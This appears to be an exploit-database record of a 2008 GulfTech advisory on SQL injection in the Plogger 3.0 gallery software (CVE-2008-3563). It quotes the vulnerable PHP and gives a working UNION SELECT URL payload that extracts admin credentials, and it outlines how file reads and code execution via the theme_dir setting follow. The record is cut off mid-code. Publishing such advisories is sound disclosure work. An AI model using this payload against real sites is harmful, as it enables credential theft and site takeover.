{
    "text": "ecve : CVE-2008-3563 ， title : Plogger 3.0 - SQL Injection - PHP webapps Exploit ， verified : Verified ， exploit_detail :  ，  # GulfTech Security Research August 05 , 2008 ，  # Vendor : Mike Johnson ，  # URL :  ，  # Version : Plogger <= 3.0 ，  # Risk : SQL Injection ， Description :  ， Plogger is a popular online gallery tool written in php that ， allows users to create an online gallery. It is vulnerable to ， SQL Injection issues , which also allow for arbitrary file ， disclosure since certain data from the returned SQL results is ， used as a filename argument when calling file_get_contents (  ) . ， Together these issues can be used to completely take over the ， vulnerable Plogger application. All users should upgrade their ， Plogger installations as soon as possible. ， SQL Injection :  ， There are a number of SQL Injection issues within plogger. The ， issues can be found in plog-download.php , and plog-remote.php ， As mentioned earlier this issue also allows for the download ， of arbitrary files on the target web server. ， elseif (  $ type == \"album\" |  |  $ type == \"search\" ) { ， foreach (  $ checked as $ pid ) { ，  $ query = \"SELECT * FROM `\".TABLE_PREFIX.\"pictures` WHERE `id`='\". $ pid.\"'\" ;  ，  $ result = run_query (  $ query )  ;  ，  $ file_contents = file_get_contents ( \"images/\". $ row [ \"path\" ]  , true )  ;  ，  $ zipfile -> add_file (  $ file_contents ,  $ row [ \"path\" ]  )  ;  ， The above code comes from plog-download.php @ lines 285-297 ， and shows how both SQL Injection and arbitrary file access are ， possible via the same flaw. The \"checked\" variable is taken ， directly from $ _REQUEST [ 'checked' ] and never get's sanitized. ， The issues in plog-remote.php are similar and basically come ， down to the various commands sending unsanitized gpc variables ， to the get_album_by_name (  ) function. The only commands within ， plog-remote.php that are not vuln are \"fetch-albums\" and \"login\" ， /plog-download.php?dl_type=album&checked [  ] =' UNION SELECT concat ，  ( admin_username , char ( 58 )  , admin_password )  , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ，  , 0 , 0 FROM plogger_config/ *  ， The above url would successfully download the admin credentials ， in the form of a zip file. To read arbitrary files on the server ， vs reading admin credentials an attacker simply need to supply ， the relative location of a file on the webserver in place of the ， data in the first column of the union select above. It is also ， worth mentioning that once an attacker has admin access , executing ， arbitrary code is very much possible by updating the \"theme_dir\" ， settings in the database to include an arbitrary path to an ， uploaded image , that is terminated with a null byte. ， // insert into database ，  $ new_theme_dir = basename (  $ _REQUEST [ \"activate\" ]  )  ;  ，  $ metafile = $ config [ 'basedir' ] . '/themes/' . $ new_theme_dir . '/meta.php' ;  ， include (  $ metafile )  ;  ，  $ sql = 'UPDATE '.TABLE_PREFIX.'config SET `theme_dir` = \\''. $ new_theme_dir.'\\'' ;  ，  $ name = $ theme_name . ' ' . $ version ;  ，  $ output .= '<p",
    "time": "2008-08-05"
}